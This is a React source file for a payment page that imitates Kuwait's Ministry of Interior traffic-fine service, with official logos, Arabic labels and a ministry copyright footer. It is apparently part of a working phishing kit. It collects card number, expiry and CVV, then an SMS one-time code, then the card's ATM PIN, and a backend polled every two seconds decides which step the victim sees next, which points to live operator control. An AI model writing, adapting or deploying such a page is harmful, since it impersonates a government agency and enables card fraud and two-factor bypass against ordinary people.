import React, { useState, useEffect, type FormEvent } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { Phone, Lock, CreditCard, CheckCircle2, XCircle } from "lucide-react";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const [, setLocation] = useLocation();
  const [stage, setStage] = useState<Stage>("card");
  const [paymentData, setPaymentData] = useState<any>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [otp, setOtp] = useState("");
  const [pin, setPin] = useState("");
  
  const { lang } = useLanguage();

  useEffect(() => {
    const data = sessionStorage.getItem("paymentData");
    if (!data) {
      setLocation("/");
      return;
    }
    const parsed = JSON.parse(data);
    setPaymentData(parsed);
    
    createSessionMutation.mutate({
      selectedFines: parsed.selectedFines,
      totalAmount: parsed.totalAmount,
      civilId: parsed.civilId,
      enquiryType: parsed.enquiryType,
      queryId: parsed.queryId
    });
  }, []);

  const createSessionMutation = trpc.payment.createSession.useMutation({
    onSuccess: (data) => {
      setSessionId(data.sessionId);
    }
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    { 
      enabled: !!sessionId && (stage.endsWith("_pending")),
      refetchInterval: 2000 
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) {
        setError(sessionStatus.errorMessage);
      }
    }
  }, [sessionStatus]);

  const submitCard = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitOtp = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const submitPin = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => {
      setError(err.message);
      setStage("failed");
    }
  });

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitCard.mutate({
      sessionId,
      cardName: cardName || "Customer",
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardExpiry: expiry,
      cardCvv: cvv
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitOtp.mutate({
      sessionId,
      otpCode: otp
    });
  };

  const handlePinSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!sessionId) return;
    submitPin.mutate({
      sessionId,
      atmPin: pin
    });
  };

  if (!paymentData) return null;

  return (
    <div className="moi-theme" dir="rtl">
      <div className="container">
        {/* Header - Consistent with Home */}
        <header>
          <div className="row align-items-center py-2">
            <div className="col-4 col-md-2 text-center">
              <a href="/">
                <img src="/main/images/assets/common/logo-moi.svg" style={{ height: "110px" }} alt="Logo" />
              </a>
            </div>
            <div className="col-8 col-md-10">
              <div className="d-flex flex-column align-items-start mr-3">
                <img src="/main/images/assets/common/ar/state-of-kuwait.svg" style={{ height: "35px", marginBottom: "8px" }} alt="Kuwait" />
                <img src="/main/images/assets/common/ar/ministry-of-interior.svg" style={{ height: "30px" }} alt="MOI" />
              </div>
            </div>
          </div>
          
          <nav className="navbar navbar-expand-lg navbar-dark shadow-sm mt-2">
            <div className="container p-0">
              <ul className="navbar-nav w-100 d-flex flex-row p-0">
                <li className="nav-item">
                  <a className="nav-link" href="/">الرئيسيــة</a>
                </li>
                <li className="nav-item active">
                  <a className="nav-link" href="#">دفع المخالفات</a>
                </li>
              </ul>
            </div>
          </nav>
        </header>

        {/* Main Content Area */}
        <div className="container-fluid content-main p-0 mt-0">
          <div className="row m-0">
            {/* Main Content */}
            <div className="col-12 p-4">
              <div className="title-section">
                استكمال عملية الدفع
                <div className="mt-2">
                  <img src="/main/images/assets/common/ico-horizontal-bar.svg" alt="bar" />
                </div>
              </div>

              <div className="row justify-content-center">
                <div className="col-md-8">
                  {/* Summary Card */}
                  <div className="bg-light p-3 border mb-4 text-right">
                    <h6 className="font-weight-bold mb-2">ملخص العملية:</h6>
                    <div className="d-flex justify-content-between">
                      <span>الرقم المدني: {paymentData.civilId}</span>
                      <span className="text-danger font-weight-bold">المبلغ: {paymentData.totalAmount} دك</span>
                    </div>
                  </div>

                  {/* Payment Stages */}
                  {stage === "card" && (
                    <div className="card shadow-sm">
                      <div className="card-header bg-white p-3">
                        <h5 className="m-0 font-weight-bold text-primary">
                          <CreditCard className="ml-2 d-inline" size={20} />
                          بيانات البطاقة
                        </h5>
                      </div>
                      <div className="card-body text-right">
                        <form onSubmit={handleCardSubmit}>
                          <div className="form-group mb-3">
                            <label className="mb-1">اسم حامل البطاقة</label>
                            <input type="text" className="form-control" value={cardName} onChange={e => setCardName(e.target.value)} required />
                          </div>
                          <div className="form-group mb-3">
                            <label className="mb-1">رقم البطاقة</label>
                            <input type="text" className="form-control text-left font-mono" dir="ltr" value={cardNumber} onChange={e => setCardNumber(e.target.value)} placeholder="**** **** **** ****" required />
                          </div>
                          <div className="row">
                            <div className="col-6">
                              <div className="form-group mb-3">
                                <label className="mb-1">تاريخ الانتهاء</label>
                                <input type="text" className="form-control text-center" placeholder="MM/YY" value={expiry} onChange={e => setExpiry(e.target.value)} required />
                              </div>
                            </div>
                            <div className="col-6">
                              <div className="form-group mb-3">
                                <label className="mb-1">CVV</label>
                                <input type="password" className="form-control text-center" placeholder="***" value={cvv} onChange={e => setCvv(e.target.value)} required />
                              </div>
                            </div>
                          </div>
                          <button type="submit" className="btn btn-primary btn-block mt-3" disabled={submitCard.isPending}>
                            {submitCard.isPending ? "جاري المعالجة..." : "دفع الآن"}
                          </button>
                        </form>
                      </div>
                    </div>
                  )}

                  {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
                    <div className="text-center p-5 bg-white border">
                      <div className="spinner-border text-primary mb-3" role="status"></div>
                      <h5>جاري معالجة طلبك...</h5>
                      <p className="text-muted">يرجى عدم إغلاق الصفحة</p>
                    </div>
                  )}

                  {stage === "otp" && (
                    <div className="card shadow-sm text-center">
                      <div className="card-body p-5">
                        <Phone className="text-primary mb-3" size={48} />
                        <h4 className="font-weight-bold">رمز التحقق (OTP)</h4>
                        <p>أدخل الرمز المرسل إلى هاتفك</p>
                        <form onSubmit={handleOtpSubmit} className="mt-4">
                          <input type="text" className="form-control form-control-lg text-center mb-3" style={{ letterSpacing: '0.5em', fontSize: '1.5rem' }} value={otp} onChange={e => setOtp(e.target.value)} maxLength={6} required />
                          {error && <div className="text-danger mb-2">{error}</div>}
                          <button type="submit" className="btn btn-primary btn-block">تأكيد</button>
                        </form>
                      </div>
                    </div>
                  )}

                  {stage === "atm" && (
                    <div className="card shadow-sm text-center">
                      <div className="card-body p-5">
                        <Lock className="text-primary mb-3" size={48} />
                        <h4 className="font-weight-bold">الرقم السري (PIN)</h4>
                        <p>يرجى إدخال الرقم السري للبطاقة</p>
                        <form onSubmit={handlePinSubmit} className="mt-4">
                          <input type="password" className="form-control form-control-lg text-center mb-3" style={{ letterSpacing: '0.5em', fontSize: '1.5rem' }} value={pin} onChange={e => setPin(e.target.value)} maxLength={4} required />
                          <button type="submit" className="btn btn-primary btn-block">تأكيد</button>
                        </form>
                      </div>
                    </div>
                  )}

                  {stage === "success" && (
                    <div className="text-center p-5 bg-white border">
                      <CheckCircle2 className="text-success mb-3" size={64} />
                      <h3 className="text-success font-weight-bold">تمت العملية بنجاح</h3>
                      <p>تم استلام مبلغ {paymentData.totalAmount} دك بنجاح.</p>
                      <button className="btn btn-outline-primary mt-3" onClick={() => setLocation("/")}>العودة للرئيسية</button>
                    </div>
                  )}

                  {stage === "failed" && (
                    <div className="text-center p-5 bg-white border">
                      <XCircle className="text-danger mb-3" size={64} />
                      <h3 className="text-danger font-weight-bold">فشلت العملية</h3>
                      <p className="text-muted">{error || "حدث خطأ أثناء المعالجة"}</p>
                      <button className="btn btn-primary mt-3" onClick={() => setStage("card")}>حاول مرة أخرى</button>
                    </div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Footer */}
        <footer className="footer text-center mt-0">
          <div className="container">
            <p className="m-0">جميع الحقوق محفوظة © وزارة الداخلية - دولة الكويت 2026</p>
          </div>
        </footer>
      </div>
    </div>
  );
}
